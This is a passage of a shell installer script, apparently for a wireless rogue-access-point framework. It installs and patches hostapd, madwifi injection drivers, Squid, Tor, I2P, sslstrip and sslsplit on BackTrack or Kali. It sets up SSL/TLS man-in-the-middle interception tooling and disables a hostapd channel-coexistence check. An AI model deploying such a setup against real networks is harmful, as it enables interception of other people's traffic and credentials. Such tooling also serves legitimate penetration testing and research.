	$necho "[....] Installing Apache2 - Web server."
	eval apt-get install -y apache2 apache2-mpm-prefork apache2.2-common $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing Apache2 - Web server."
	$necho "[....] Do not start Apache2 on Start Up."
	eval update-rc.d apache2 disable $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Do not start Apache2 on Start Up."
	echo
fi

# Download and install dnsmasq only if it isn't installed
if [ -f /usr/sbin/dnsmasq ];then
	$cecho "[ "$GREEN"found"$END" ] DNSmasq: A small caching DNS proxy and DHCP/TFTP server."			
else
	$necho "[....] Installing DNSmasq."
	eval apt-get install -y dnsmasq $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing DNSmasq."
	$necho "[....] Do not start dnsmasq on Start Up."
	eval update-rc.d dnsmasq disable $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Do not start dnsmasq on Start Up."
fi

# Download and install haveged only if it isn't installed
if [ -f /usr/sbin/haveged ];then
	$cecho "[ "$GREEN"found"$END" ] Haveged: Linux entropy source using the HAVEGE algorithm."			
else
	$necho "[....] Installing Haveged: Linux entropy source using the HAVEGE algorithm."
	eval apt-get install -y haveged $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing Haveged: Linux entropy source using the HAVEGE algorithm."
	$necho "[....] Do not start Haveged on Start Up."
	eval update-rc.d haveged disable $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Do not start Haveged on Start Up."
	
fi

# Download and install Squid3 only if it isn't installed
if [ -f /usr/sbin/squid3 ];then
	$necho "[ "$GREEN"found"$END" ] Squid3 v"`squid3 -v | grep "Version" | awk '{print $4}'`": Full featured Web Proxy cache (HTTP proxy)"
		if [ -n "`squid3 -v | grep -o "'--enable-ssl-crtd'"`" ] && [ -n "`squid3 -v | grep -o "'--enable-ssl'"`" ];then
			$cecho " with SSL support."
		else
			$cecho " without SSL support."
		fi
else
	$necho "[....] Installing Squid3 - Proxy caching server for web clients."
	eval apt-get install -y squid3 squid3-common squid-langpack $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing Squid3 - Proxy caching server for web clients."
	#$necho "[....] Creating Squid HTTP Proxy 3.x cache structure."
	#eval squid3 -z $no_out
	#$cecho "\r[ "$GREEN"ok"$END" ] Creating Squid HTTP Proxy 3.x cache structure."
	$necho "[....] Do not start Squid3 on Start Up."
	eval update-rc.d squid3 disable $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Do not start Squid3 on Start Up."
fi

# Download and install Sarg only if it isn't installed
if [ -f /usr/bin/sarg ];then
	$cecho "[ "$GREEN"found"$END" ] Sarg: Squid Analysis Report Generator."
else
	$necho "[....] Installing Sarg - Squid Analysis Report Generator."
	eval apt-get install -y udo sarg $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing Sarg - Squid Analysis Report Generator."
	echo
fi

# Download and install Hostapd v2.3 devel only if it isn't installed.
if [ "$OS" = "BackTrack_5R3" ];then 
	if [ -f /usr/bin/hostapd ] || [ -f /usr/local/bin/hostapd ] || [ -f /usr/sbin/hostapd ];then
		hostapd -v  2> $HOME_DIR/hostapd_version.txt
			if [ -n "`grep 'v2.3-devel' $HOME_DIR/hostapd_version.txt`" ];then
				$cecho "[ "$GREEN"found"$END" ] Hostapd v2.3-devel: User space IEEE 802.11 AP and IEEE 802.1X/WPA/WPA2/EAP Authenticator."
				rm $HOME_DIR/hostapd_version.txt
			fi
	else 
		$cecho "----Installing Hostapd v2.3 devel----"
			if [ ! -d /usr/src/linux-headers-"`uname -r`" ];then
				$necho "[....] Installing  - linux-headers-"`uname -r`", build-essential."
				eval apt-get install -y linux-headers-"`uname -r`" build-essential $no_out
				$cecho "\r[ "$GREEN"ok"$END" ] Installing  - linux-headers-"`uname -r`", build-essential."
			fi
		$necho "[....] Installing  - libnl-dev, libssl-dev, libssl0.9.8"
		eval apt-get install -y libnl-dev libssl-dev libssl0.9.8 $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Installing  - libnl-dev, libssl-dev, libssl0.9.8"
		$necho "[....] Downloading - Hostapd v2.3 devel."
		cd $HOME_DIR
		# We are going to download hostapd v2.2 stable or v2.3 devel?
		eval git clone git://w1.fi/srv/git/hostap.git $no_out
		#wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz
		#tar zxf hostapd-2.2.tar.gz
		#rm $HOME_DIR/hostapd-2.2.tar.gz
		$cecho "\r[ "$GREEN"ok"$END" ] Downloading - Hostapd v2.x devel."
			if [ -n "$ATH" ] && [ ! -d $HOME_DIR/madwifi-ng ] && [ "$ATH_PROMPT" = "yes" ];then
				$necho "[....] Downloading - Madwifi-ng revision 4181 - (madwifi driver for Hostapd)"
				cd $HOME_DIR
				wget -q http://snapshots.madwifi-project.org/madwifi-trunk/madwifi-trunk-r4181-20140204.tar.gz
				eval tar zxf madwifi-trunk-r4181-20140204.tar.gz $no_out
				mv madwifi-trunk-r4181-20140204 madwifi-ng
				$cecho "\r[ "$GREEN"ok"$END" ] Downloading - Madwifi-ng revision 4181 - (madwifi driver for Hostapd)"
				$necho "[....] Downloading madwifi-ng patch for injection from aircrack-ng."
				wget -q http://patches.aircrack-ng.org/madwifi-ng-r4073.patch
				$cecho "\r[ "$GREEN"ok"$END" ] Downloading madwifi-ng patch for injection from aircrack-ng."
				echo
				$necho "[....] Patching madwifi-ng drivers for injection."
				eval patch -N -p 0 -i $HOME_DIR/madwifi-ng-r4073.patch $no_out
				rm $HOME_DIR/madwifi-ng-r4073.patch
				$cecho "\r[ "$GREEN"ok"$END" ] Patching madwifi-ng drivers for injection."
				$necho "[....] Modifying hostapd's defconfig file to be able to compile madwifi-ng driver."
				sed 's%#CONFIG_DRIVER_MADWIFI=y%CONFIG_DRIVER_MADWIFI=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
				sed 's%#CFLAGS += -I../../madwifi # change to the madwifi source directory%CFLAGS += -I'$HOME_DIR'/madwifi-ng # change to the madwifi source directory%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
				$cecho "\r[ "$GREEN"ok"$END" ] Modifying hostapd's defconfig file to be able to compile madwifi-ng driver."
			fi
		cd $HOME_DIR/hostap/hostapd
		# Set to yes: CONFIG_DRIVER_HOSTAP, CONFIG_DRIVER_NL80211, CONFIG_LIBNL32, CONFIG_IEEE80211N, CONFIG_IEEE80211AC, CONFIG_ACS
		# Use openssl libraries
		# Enable: WPS and UPnP support for external WPS Registrars
		sed 's%#CONFIG_DRIVER_HOSTAP=y%CONFIG_DRIVER_HOSTAP=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_DRIVER_NL80211=y%CONFIG_DRIVER_NL80211=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_LIBNL32=y%CONFIG_LIBNL32=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_IEEE80211N=y%CONFIG_IEEE80211N=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_IEEE80211AC=y%CONFIG_IEEE80211AC=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_ACS=y%CONFIG_ACS=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_TLS=openssl%CONFIG_TLS=openssl%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_WPS=y%CONFIG_WPS=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_WPS_UPNP=y%CONFIG_WPS_UPNP=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig	
		cp $HOME_DIR/hostap/hostapd/defconfig $HOME_DIR/hostap/hostapd/.config
		
		# http://www.brunsware.de/blog/gentoo/hostapd-40mhz-disable-neighbor-check.html
		# Disable bss neighbor check/force 40 MHz channels in hostapd
		# We disable this: (from hostapd)
		# "Please note that 40 MHz channels may switch their primary and secondary channels if needed or creation of 40 MHz channel maybe rejected based
		# on overlapping BSSes. These changes are done automatically when hostapd is setting up the 40 MHz channel."

		$necho "[....] Creating patch file: Disable bss neighbor check."
cat > $HOME_DIR/hostap/src/ap/hw_features.patch << EOF
--- hw_features.c	2014-08-26 22:33:04.636022614 +0000
+++ hw_features.c	2014-08-26 23:06:39.360048788 +0000
@@ -539,7 +539,7 @@
 			   iface->conf->channel,
 			   iface->conf->channel +
 			   iface->conf->secondary_channel * 4);
-		iface->conf->secondary_channel = 0;
+		/* iface->conf->secondary_channel = 0; */
 		if (iface->drv_flags & WPA_DRIVER_FLAGS_HT_2040_COEX) {
 			/*
 			 * TODO: Could consider scheduling another scan to check
EOF
		$cecho "\r[ "$GREEN"ok"$END" ] Creating patch file: Disable bss neighbor check."
		$necho "[....] Patching: Disable bss neighbor check/force 40 MHz channels in hostapd."
		eval patch $HOME_DIR/hostap/src/ap/hw_features.c < $HOME_DIR/hostap/src/ap/hw_features.patch $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Patching: Disable bss neighbor check/force 40 MHz channels in hostapd."
		$necho "[....] Compiling Hostapd v2.3 devel. - Please wait..."
		eval make clean $no_out
		eval make $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Compiling Hostapd v2.3 devel.                 "
		$necho "[....] Installing Hostapd v2.3 devel."
		eval make install $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Installing Hostapd v2.3 devel."
		rm -r -f $HOME_DIR/hostap
		echo
	fi
elif [ "$OS" = "KALI_linux" ];then 
	if [ -f /usr/bin/hostapd ] || [ -f /usr/local/bin/hostapd ] || [ -f /usr/sbin/hostapd ];then
		hostapd -v  2> $HOME_DIR/hostapd_version.txt
			if [ -n "`grep 'v2' $HOME_DIR/hostapd_version.txt`" ];then   
				$cecho "[ "$GREEN"found"$END" ] Hostapd v2.3-devel: User space IEEE 802.11 AP and IEEE 802.1X/WPA/WPA2/EAP Authenticator."
				rm $HOME_DIR/hostapd_version.txt
			fi
	else
		$cecho "----Installing Hostapd v2.3 devel----"
			if [ ! -d /usr/src/linux-headers-"`uname -r`" ];then
				$necho "[....] Installing  - linux-headers-"`uname -r`", build-essential."
				eval apt-get install -y linux-headers-"`uname -r`" build-essential $no_out
				$cecho "\r[ "$GREEN"ok"$END" ] Installing  - linux-headers-"`uname -r`", build-essential."
			fi
		$necho "[....] Installing  - libnl-3-dev, libssl-dev, libssl1.0.0"
		eval apt-get install -y libnl-3-dev libssl-dev libssl1.0.0 $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Installing  - libnl-3-dev, libssl-dev, libssl1.0.0"
		# Creating symbolic links
			if [ "`getconf LONG_BIT`" = 32 ];then
				if [ ! -f /lib/"`dpkg --print-architecture`"-linux-gnu/libnl.so ] || [ ! -f /lib/"`dpkg --print-architecture`"-linux-gnu/libnl-genl.so ] || [ ! -f /lib/"`dpkg --print-architecture`"-linux-gnu/libnl-genl-3.so ] || [ ! -e /usr/include/netlink ];then
					if [ ! -e /usr/include/netlink ];then
						ln -s /usr/include/libnl3/netlink/ /usr/include/
					fi
					ln -s /lib/"`dpkg --print-architecture`"-linux-gnu/libnl-3.so.200.5.2 /lib/"`dpkg --print-architecture`"-linux-gnu/libnl.so
					ln -s /lib/"`dpkg --print-architecture`"-linux-gnu/libnl-genl-3.so.200.5.2 /lib/"`dpkg --print-architecture`"-linux-gnu/libnl-genl.so
					ln -s /lib/"`dpkg --print-architecture`"-linux-gnu/libnl-genl-3.so.200.5.2 /lib/"`dpkg --print-architecture`"-linux-gnu/libnl-genl-3.so
				fi
			elif [ "`getconf LONG_BIT`" = 64 ];then
				if [ ! -f /lib/"`uname -m`"-linux-gnu/libnl.so ] || [ ! -f /lib/"`uname -m`"-linux-gnu/libnl-genl.so ] || [ ! -f /lib/"`uname -m`"-linux-gnu/libnl-genl-3.so ] || [ ! -e /usr/include/netlink ];then
					if [ ! -e /usr/include/netlink ];then
						ln -s /usr/include/libnl3/netlink/ /usr/include/
					fi
					ln -s /lib/"`uname -m`"-linux-gnu/libnl-3.so.200.5.2 /lib/"`uname -m`"-linux-gnu/libnl.so
					ln -s /lib/"`uname -m`"-linux-gnu/libnl-genl-3.so.200.5.2 /lib/"`uname -m`"-linux-gnu/libnl-genl.so
					ln -s /lib/"`uname -m`"-linux-gnu/libnl-genl-3.so.200.5.2 /lib/"`uname -m`"-linux-gnu/libnl-genl-3.so
				fi
			fi
		$necho "[....] Downloading - Hostapd v2.3 devel."
		cd $HOME_DIR
		# We are going to download hostapd v2.2 stable or v2.3 devel?
		eval git clone git://w1.fi/srv/git/hostap.git $no_out
		#wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz
		#tar zxf hostapd-2.2.tar.gz
		#rm $HOME_DIR/hostapd-2.2.tar.gz
		$cecho "\r[ "$GREEN"ok"$END" ] Downloading - Hostapd v2.x devel."
			if [ -n "$ATH" ] && [ ! -d $HOME_DIR/madwifi-ng ] && [ "$ATH_PROMPT" = "yes" ];then
				$necho "[....] Downloading - Madwifi-ng revision 4181 beta - (madwifi driver for Hostapd)"
				cd $HOME_DIR
				eval git clone https://github.com/proski/madwifi $HOME_DIR/madwifi-ng $no_out
				$cecho "\r[ "$GREEN"ok"$END" ] Downloading - Madwifi-ng revision 4181 beta - (madwifi driver for Hostapd)"
				$necho "[....] Downloading madwifi-ng patch for injection from aircrack-ng."
				wget -q http://patches.aircrack-ng.org/madwifi-ng-r4073.patch
				$cecho "\r[ "$GREEN"ok"$END" ] Downloading madwifi-ng patch for injection from aircrack-ng."
				echo
				$necho "[....] Patching madwifi-ng drivers for injection."
				eval patch -N -p 0 -i $HOME_DIR/madwifi-ng-r4073.patch $no_out
				rm $HOME_DIR/madwifi-ng-r4073.patch
				$cecho "\r[ "$GREEN"ok"$END" ] Patching madwifi-ng drivers for injection."
				$necho "[....] Modifying hostapd's defconfig file to be able to compile madwifi-ng driver."
				sed 's%#CONFIG_DRIVER_MADWIFI=y%CONFIG_DRIVER_MADWIFI=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
				sed 's%#CFLAGS += -I../../madwifi # change to the madwifi source directory%CFLAGS += -I'$HOME_DIR'/madwifi-ng # change to the madwifi source directory%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
				$cecho "\r[ "$GREEN"ok"$END" ] Modifying hostapd's defconfig file to be able to compile madwifi-ng driver."
			fi
		cd $HOME_DIR/hostap/hostapd
		# Set to yes: CONFIG_DRIVER_HOSTAP, CONFIG_DRIVER_NL80211, CONFIG_LIBNL32, CONFIG_IEEE80211N, CONFIG_IEEE80211AC, CONFIG_ACS
		# Use openssl libraries
		# Enable: WPS and UPnP support for external WPS Registrars
		sed 's%#CONFIG_DRIVER_HOSTAP=y%CONFIG_DRIVER_HOSTAP=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_DRIVER_NL80211=y%CONFIG_DRIVER_NL80211=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_LIBNL32=y%CONFIG_LIBNL32=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_IEEE80211N=y%CONFIG_IEEE80211N=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_IEEE80211AC=y%CONFIG_IEEE80211AC=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_ACS=y%CONFIG_ACS=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_TLS=openssl%CONFIG_TLS=openssl%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_WPS=y%CONFIG_WPS=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		sed 's%#CONFIG_WPS_UPNP=y%CONFIG_WPS_UPNP=y%g' $HOME_DIR/hostap/hostapd/defconfig > $HOME_DIR/hostap/hostapd/defconfig1 && mv $HOME_DIR/hostap/hostapd/defconfig1 $HOME_DIR/hostap/hostapd/defconfig
		cp $HOME_DIR/hostap/hostapd/defconfig $HOME_DIR/hostap/hostapd/.config	

		# http://www.brunsware.de/blog/gentoo/hostapd-40mhz-disable-neighbor-check.html
		# Disable bss neighbor check/force 40 MHz channels in hostapd
		# We disable this: (from hostapd)v2.3 devel
		# "Please note that 40 MHz channels may switch their primary and secondary channels if needed or creation of 40 MHz channel maybe rejected based
		# on overlapping BSSes. These changes are done automatically when hostapd is setting up the 40 MHz channel."

		$necho "[....] Creating patch file: Disable bss neighbor check/force 40 MHz channels."
cat > $HOME_DIR/hostap/src/ap/hw_features.patch << EOF
--- hw_features.c	2014-08-26 22:33:04.636022614 +0000
+++ hw_features.c	2014-08-26 23:06:39.360048788 +0000
@@ -539,7 +539,7 @@
 			   iface->conf->channel,
 			   iface->conf->channel +
 			   iface->conf->secondary_channel * 4);
-		iface->conf->secondary_channel = 0;
+		/* iface->conf->secondary_channel = 0; */
 		if (iface->drv_flags & WPA_DRIVER_FLAGS_HT_2040_COEX) {
 			/*
 			 * TODO: Could consider scheduling another scan to check
EOF
		$cecho "\r[ "$GREEN"ok"$END" ] Creating patch file: Disable bss neighbor check/force 40 MHz channels."
		$necho "[....] Patching: Disable bss neighbor check/force 40 MHz channels in hostapd."
		eval patch $HOME_DIR/hostap/src/ap/hw_features.c < $HOME_DIR/hostap/src/ap/hw_features.patch $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Patching: Disable bss neighbor check/force 40 MHz channels in hostapd."
		$necho "[....] Compiling Hostapd v2.3 devel. - Please wait..."
		eval make clean $no_out
		eval make $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Compiling Hostapd v2.3 devel.                 "
		$necho "[....] Installing Hostapd v2.3 devel."
		eval make install $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Installing Hostapd v2.3 devel."
		rm -r -f $HOME_DIR/hostap
		echo
	fi
fi 

# Download and install TOR and ARM from Tor repository only if they aren't installed
if [ -f /usr/bin/tor ] && [ -f /usr/bin/arm ];then
	$cecho "[ "$GREEN"found"$END" ] TOR (The Onion Router): A connection-based low-latency anonymous communication system."
	$cecho "[ "$GREEN"found"$END" ] ARM (The Anonymizing Relay Monitor): Terminal status monitor for TOR."
else
	$necho "[....] Adding TOR's repository to APT's /etc/apt/sources.list file."
		if [ "$OS" = "KALI_linux" ];then
			echo "deb http://deb.torproject.org/torproject.org wheezy main" >> /etc/apt/sources.list
		else
			echo "deb http://deb.torproject.org/torproject.org "`lsb_release -c | awk '{print $2}'`" main" >> /etc/apt/sources.list
		fi
	$cecho "\r[ "$GREEN"ok"$END" ] Adding TOR's repository to APT's /etc/apt/sources.list file."
	$necho "[....] Installing the keys to sign the repository and add it to apt."
	eval gpg --keyserver keys.gnupg.net --recv 886DDD89 $no_out
	gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 >> $HOME_DIR/debian-repo.pub
	eval apt-key add $HOME_DIR/debian-repo.pub $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing the keys to sign the repository and add it to apt."
	$necho "[....] Updating Repositories."
	eval apt-get update $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Updating Repositories."
	$necho "[....] Installing TOR (The Onion Router)."
	eval apt-get install --force-yes -y deb.torproject.org-keyring $no_out
	eval apt-get install --force-yes -y tor tor-geoipdb torsocks $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing TOR (The Onion Router)."
	$necho "[....] Do not start TOR on Start Up."
	eval update-rc.d tor disable $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Do not start TOR on Start Up."
	$necho "[....] Installing ARM (The Anonymizing Relay Monitor)."
	eval apt-get install --force-yes -y tor-arm $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing ARM (The Anonymizing Relay Monitor)."
	$necho "[....] Removing TOR's repository from APT's /etc/apt/sources.list file."
	grep -v "deb http://deb.torproject.org/torproject.org" /etc/apt/sources.list > /etc/apt/sources.list1 && mv /etc/apt/sources.list1 /etc/apt/sources.list
	$cecho "\r[ "$GREEN"ok"$END" ] Removing TOR's repository from APT's /etc/apt/sources.list file."
	if [ -f $HOME_DIR/debian-repo.pub ];then
		rm $HOME_DIR/debian-repo.pub
	fi
	$necho "[....] Updating Repositories."
	eval apt-get update $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Updating Repositories."
	$necho "[....] Do not start TOR on Start Up."
	eval update-rc.d tor disable $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Do not start TOR on Start Up."	
	echo
fi

# Download and install I2P router only if it isn't installed
if [ -f $i2prouter_path/i2prouter ];then
	$cecho "[ "$GREEN"found"$END" ] i2p (The Invisible Internet Project)."
else
	if [ "$OS" = "BackTrack_5R3" ];then
		#i2p -bt5r3
		cd $HOME_DIR
		$necho "[....] Downloading I2P (The Invisible Internet Project)."
		wget -q --no-check-certificate https://download.i2p2.de/releases/0.9.13/i2pinstall_0.9.13.jar
		$cecho "\r[ "$GREEN"ok"$END" ] Downloading I2P (The Invisible Internet Project)."
		$cecho ""$RED"Installing I2P (The Invisible Internet Project)"$END""
		$necho "Installing I2P (The Invisible Internet Project)."
		$cecho ""$RED"Please follow the on-screen instructions. Use default path to install"$END""
		java -jar i2pinstall_0.9.13.jar
		$cecho ""$GREEN"Done..."$END""
		# java -jar i2pinstall_0.9.13.jar -console
		# /usr/local/i2p/i2prouter -> ALLOW_ROOT=true
		$necho "[....] Modifying i2prouter to run as root."
		sed 's%#ALLOW_ROOT=true%ALLOW_ROOT=true%g' $i2prouter_path/i2prouter > $i2prouter_path/i2prouter1 && mv $i2prouter_path/i2prouter1 $i2prouter_path/i2prouter
		chmod +x $i2prouter_path/i2prouter
		$cecho "\r[ "$GREEN"ok"$END" ] Modifying i2prouter to run as root."
		echo
	fi
	if [ "$OS" = "KALI_linux" ];then
		# Kali
		cd $HOME_DIR
		$necho "[....] Adding i2P's repository to APT's /etc/apt/sources.list file."
		echo "deb http://deb.i2p2.no/ stable main" >> /etc/apt/sources.list 
		echo "deb-src http://deb.i2p2.no/ stable main" >> /etc/apt/sources.list
		$cecho "\r[ "$GREEN"ok"$END" ] Adding i2P's repository to APT's /etc/apt/sources.list file."
		$necho "[....] Installing the keys to sign the repository and add it to apt."
		wget -q https://geti2p.net/_static/debian-repo.pub
		eval apt-key add debian-repo.pub $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Installing the keys to sign the repository and add it to apt."
		$necho "[....] Updating Repositories."
		eval apt-get update $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Updating Repositories."
		$necho "[....] Installing I2P (The Invisible Internet Project)."
		eval apt-get install --force-yes -y i2p i2p-keyring $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Installing I2P (The Invisible Internet Project)."
		$necho "[....] Removing I2P's repository from APT's /etc/apt/sources.list file."
		grep -v "http://deb.i2p2.no/" /etc/apt/sources.list > /etc/apt/sources.list1 && mv /etc/apt/sources.list1 /etc/apt/sources.list
		$cecho "\r[ "$GREEN"ok"$END" ] Removing I2P's repository from APT's /etc/apt/sources.list file."
		if [ -f $HOME_DIR/debian-repo.pub ];then
			rm $HOME_DIR/debian-repo.pub
		fi
		$necho "[....] Updating Repositories."
		eval apt-get update $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Updating Repositories."
		$necho "[....] Modifying i2prouter to run as root."
		sed 's%#ALLOW_ROOT=true%ALLOW_ROOT=true%g' $i2prouter_path/i2prouter > $i2prouter_path/i2prouter1 && mv $i2prouter_path/i2prouter1 $i2prouter_path/i2prouter
		chmod +x $i2prouter_path/i2prouter
		$cecho "\r[ "$GREEN"ok"$END" ] Modifying i2prouter to run as root."
		$necho "[....] Do not start I2P on Start Up."
		eval update-rc.d i2p disable $no_out
		$cecho "\r[ "$GREEN"ok"$END" ] Do not start I2P on Start Up."
		echo
	fi
fi

# Download and install sslstrip only if it isn't installed
if [ -f /usr/local/bin/sslstrip ] || [ -f /usr/bin/sslstrip ];then
	$cecho "[ "$GREEN"found"$END" ] Sslstrip version `sslstrip -h | grep -m1 'sslstrip' | awk '{print $2}'` :SSL/TLS man-in-the-middle attack tool."			
else
	$cecho ""$GREEN"Sslstrip not found in your system"$END""
	$necho "[....] Downloading sslstrip v0.9: SSL/TLS man-in-the-middle attack tool."
	wget -q http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.9.tar.gz -O $HOME_DIR/sslstrip-0.9.tar.gz
	$cecho "\r[ "$GREEN"ok"$END" ] Downloading sslstrip v0.9: SSL/TLS man-in-the-middle attack tool."
	tar zxf $HOME_DIR/sslstrip-0.9.tar.gz -C $HOME_DIR
	cd $HOME_DIR/sslstrip-0.9
	$necho "[....] Installing sslstrip v0.9"
	eval python setup.py install $no-out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing sslstrip v0.9"
	cd $HOME_DIR
	rm -r sslstrip-0.9
	rm sslstrip-0.9.tar.gz
fi

# By default BT5R3 and KALI uses sslstrip v0.9 which is the latest. If you want to re-installed for some reason (not using 0.9 version or is broken) then set the SSLSTRIP_DL string to yes in aerial.conf file. 
if [ "$SSLSTRIP_DL" = "yes" ] && [ "`sslstrip -h | grep -m1 'sslstrip' | awk '{print $2}'`" != "0.9" ];then
	$cecho ""$RED"Downloading and Re-installing sslstrip v0.9"$END""
	$necho "[....] Downloading and Re-installing sslstrip v0.9"
	wget -q http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.9.tar.gz -O $HOME_DIR/sslstrip-0.9.tar.gz
	$cecho "\r[ "$GREEN"ok"$END" ] Downloading and Re-installing sslstrip v0.9"
	tar zxf $HOME_DIR/sslstrip-0.9.tar.gz -C $HOME_DIR
	cd $HOME_DIR/sslstrip-0.9
	$necho "[....] Installing sslstrip v0.9"
	eval python setup.py install $no-out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing sslstrip v0.9"
	cd $HOME_DIR
	rm -r sslstrip-0.9
	rm sslstrip-0.9.tar.gz
		if [ "`sslstrip -h | grep -m1 'sslstrip' | awk '{print $2}'`" = "0.9" ];then
			$cecho ""$GREEN"sslstrip 0.9 installed successfully"$END""
			read -p 'Press ENTER to continue...' string;echo
		else
			$cecho ""$RED"sslstrip 0.9 not installed"$END""
			$cecho ""$GREEN"Using sslstrip version `sslstrip -h | grep -m1 'sslstrip' | awk '{print $2}'`"$END""
		fi
fi

# Download and install sslsplit only if it isn't installed or update it if version < 0.4.6
if [ -f /usr/bin/sslsplit ] && [ "`dpkg -l sslsplit | grep -E "^ii" | tr -s ' ' | cut -d' ' -f3 | cut -c1-5`" = "0.4.6" ] && [ "$OS" = "KALI_linux" ];then
	$cecho "[ "$GREEN"found"$END" ] SSLsplit version 0.4.6: Transparent and scalable SSL/TLS interception"
	$necho "[....] Updating SSLsplit."	
